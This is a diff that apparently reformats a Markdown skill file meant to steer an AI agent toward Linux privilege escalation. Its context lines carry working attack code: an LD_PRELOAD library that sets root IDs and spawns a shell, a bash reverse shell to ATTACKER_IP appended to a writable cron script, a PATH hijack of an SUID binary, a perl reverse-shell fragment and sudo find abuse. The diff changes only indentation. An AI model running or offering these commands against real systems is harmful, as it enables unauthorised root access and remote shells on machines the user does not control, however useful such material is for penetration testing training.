@@ -2,8 +2,8 @@
 name: Linux Privilege Escalation
 description: This skill should be used when the user asks to "escalate privileges on Linux", "find privesc vectors on Linux systems", "exploit sudo misconfigurations", "abuse SUID binaries", "exploit cron jobs for root access", "enumerate Linux systems for privilege escalation", or "gain root access from low-privilege shell". It provides comprehensive techniques for identifying and exploiting privilege escalation paths on Linux systems.
 metadata:
-  author: zebbern
-  version: "1.1"
+ author: zebbern
+ version: "1.1"
 ---
 
 # Linux Privilege Escalation
@@ -244,10 +244,10 @@ When env_keep includes LD_PRELOAD:
 #include <stdlib.h>
 
 void _init() {
-    unsetenv("LD_PRELOAD");
-    setgid(0);
-    setuid(0);
-    system("/bin/bash");
+ unsetenv("LD_PRELOAD");
+ setgid(0);
+ setuid(0);
+ system("/bin/bash");
 }
 ```
 
@@ -350,7 +350,7 @@ systemctl list-timers
 
 ```bash
 # Identify writable cron script from /etc/crontab
-ls -la /opt/backup.sh        # Check permissions
+ls -la /opt/backup.sh # Check permissions
 echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /opt/backup.sh
 
 # If cron references non-existent script in writable PATH
@@ -369,7 +369,7 @@ strings /usr/local/bin/suid-binary
 export PATH=/tmp:$PATH
 echo -e '#!/bin/bash\n/bin/bash -p' > /tmp/service
 chmod +x /tmp/service
-/usr/local/bin/suid-binary      # Execute SUID binary
+/usr/local/bin/suid-binary # Execute SUID binary
 ```
 
 ### Phase 9: NFS Exploitation
@@ -453,7 +453,7 @@ perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getpro
 ```bash
 $ sudo -l
 User user may run the following commands:
-    (root) NOPASSWD: /usr/bin/find
+ (root) NOPASSWD: /usr/bin/find
 
 $ sudo find . -exec /bin/bash \; -quit
 # id
